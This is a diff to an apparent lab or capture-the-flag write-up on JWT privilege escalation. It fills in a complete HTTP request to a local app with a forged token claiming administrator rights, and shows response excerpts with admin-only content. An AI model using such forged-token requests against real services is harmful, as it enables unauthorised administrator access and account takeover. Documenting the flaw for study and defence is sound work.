@@ -121,7 +121,20 @@ The server accepts the manipulated JWT and grants administrator privileges.
 ```http
 GET /dashboard HTTP/1.1
 Host: 127.0.0.1
-Cookie: token=<Modified JWT>
+sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: document
+Referer: http://127.0.0.1/login
+Accept-Encoding: gzip, deflate, br
+Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InVzZXJAZ21haWwuY29tIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTc4NTgyNzU0NH0.9V5pcvDwGqmt6A-RHkhZxIcZJgpF_yioBfUgpWk6Q20
+Connection: keep-alive
 ```
 
 ---
@@ -130,6 +143,32 @@ Cookie: token=<Modified JWT>
 
 ```http
 HTTP/1.1 200 OK
+
+...
+
+<div class="nav-section-label">Admin</div>
+
+<a href="/sup3r_s3cr3t_admin">
+    Admin Panel
+</a>
+
+...
+
+<div class="sidebar-user-name">
+    admin
+</div>
+
+...
+
+<div id="account-number">
+    ADMIN001
+</div>
+
+<div class="account-card-balance">
+    $1000000.0
+</div>
+
+...
 ```
 
 The response contains administrator-only content, including:
